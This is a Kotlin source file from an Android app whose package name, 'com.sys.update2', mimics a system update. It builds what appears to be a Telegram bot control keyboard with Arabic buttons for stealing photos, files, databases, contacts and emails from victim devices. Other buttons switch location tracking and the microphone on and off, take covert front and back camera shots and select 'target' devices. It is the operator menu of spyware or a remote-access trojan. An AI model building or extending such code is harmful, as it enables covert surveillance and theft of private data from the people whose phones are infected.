package com.sys.update2

import org.json.JSONArray
import org.json.JSONObject

object KeyboardBuilder {

    @Volatile var photosOn = false
    @Volatile var locationOn = false
    @Volatile var audioOn = false

    fun replyKeyboard(): JSONObject {
        val keyboard = JSONArray()

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "📸 كل الصور"))
            put(JSONObject().put("text", "📸 آخر 50"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", if (photosOn) "🔴 إيقاف الصور" else "🟢 تشغيل الصور"))
            put(JSONObject().put("text", "🎵 كل الموسيقى"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "📁 كل الملفات"))
            put(JSONObject().put("text", "📄 المستندات"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "📦 المضغوطة"))
            put(JSONObject().put("text", "📱 APK"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "🗄 قواعد بيانات"))
            put(JSONObject().put("text", "🎬 الفيديو"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "👥 جهات الاتصال"))
            put(JSONObject().put("text", "📧 الإيميلات"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "📊 معلومات الجهاز"))
            put(JSONObject().put("text", if (locationOn) "🔴 إيقاف الموقع" else "🟢 تشغيل الموقع"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", if (audioOn) "🔴 إيقاف المايك" else "🟢 تشغيل المايك"))
            put(JSONObject().put("text", "📍 عرض الموقع"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "🤳 تصوير أمامي"))
            put(JSONObject().put("text", "📸 تصوير خلفي"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "📱 قائمة الأجهزة"))
            put(JSONObject().put("text", "🚀 جلب كل شي"))
        })

        return JSONObject().apply {
            put("keyboard", keyboard)
            put("resize_keyboard", true)
            put("one_time_keyboard", false)
            put("is_persistent", true)
        }
    }

    fun backToMenu(): JSONObject = replyKeyboard()

    fun deviceListKeyboard(devices: List<Pair<String, String>>): JSONObject {
        val keyboard = JSONArray()
        for ((id, name) in devices) {
            keyboard.put(JSONArray().apply {
                put(JSONObject().put("text", "🎯 $name"))
                put(JSONObject().put("text", "@$id"))
            })
        }
        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "🌐 كل الأجهزة"))
            put(JSONObject().put("text", "🏠 القائمة"))
        })
        return JSONObject().apply {
            put("keyboard", keyboard)
            put("resize_keyboard", true)
            put("is_persistent", true)
        }
    }
}
